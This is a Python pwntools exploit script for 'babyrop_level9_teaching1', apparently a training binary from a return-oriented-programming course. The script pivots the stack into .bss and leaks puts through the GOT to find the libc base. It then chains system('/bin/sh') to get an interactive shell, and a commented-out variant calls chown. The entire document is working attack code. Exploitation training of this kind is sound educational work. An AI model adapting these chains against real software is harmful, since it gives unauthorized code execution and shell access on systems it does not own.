#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
context.binary = 'babyrop_level9_teaching1'
e = ELF('./babyrop_level9_teaching1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = ROP(libc)
r2 = ROP(e)
getGadgetBinary = lambda x: p64(r2.find_gadget(x).address)
pivotStack = getGadgetBinary(['pop rsp', 'pop r13', 'pop rbp', 'ret'])
pivotStack += p64(0x4040c0+0x18)
# ^ redirect rsp to .bss+24 since this is where the input will be read to
# ^ and where we make the fake stack
pivotStack += p64(0x0)
# idk? where base pointer goes
pivotStack += p64(0x4040c0+0x60)
p = gdb.debug(['./babyrop_level9_teaching1'])
#p = process('./babyrop_level9_teaching1')
# payload 1: find puts and offset
# ret = getGadgetBinary(['ret'])
exploit = getGadgetBinary(['pop rdi', 'ret'])
exploit += p64(e.sym.got['puts'])
exploit += p64(e.sym.plt['puts'])
exploit += getGadgetBinary(['pop rdi', 'ret'])
exploit += p64(e.sym.got['puts'])
exploit += getGadgetBinary(['pop rsi', 'pop r15', 'ret'])
exploit += p64(e.sym.got['puts'])
exploit += p64(e.sym.got['puts'])
exploit += p64(e.sym['main'])
p.send(pivotStack+exploit)
p.recvuntil(b'Exiting!')
p.recvline()
puts_plt = u64(p.recvline()[:].ljust(8, b"\x00"))
log.info('puts is @ '+hex(puts_plt))
# payload 2: use offset to find address
offset = puts_plt-libc.sym['puts']
p.clean()
#getGadget = lambda x: p64(r.find_gadget(x).address+offset)
exploit = getGadgetBinary(['pop rdi', 'ret'])
exploit += p64(next(libc.search(b'/bin/sh'))+offset)
exploit += p64(libc.sym["system"]+offset)
exploit += p64(libc.sym["exit"]+offset)
# ret = getGadget(['ret'])
#exploit = getGadget(['pop rdi', 'ret'])
#exploit += p64(next(e.search(b"e\x00")))
#exploit += getGadget(['pop rsi', 'ret'])
#exploit += p64(1000)
#exploit += getGadget(['pop rdx', 'pop rbx', 'ret'])
#exploit += p64(1000)
#exploit += p64(0)
#exploit += p64(libc.sym["chown"])
#exploit += p64(libc.sym["exit"])
p.send(pivotStack+exploit)
p.clean()
p.interactive()
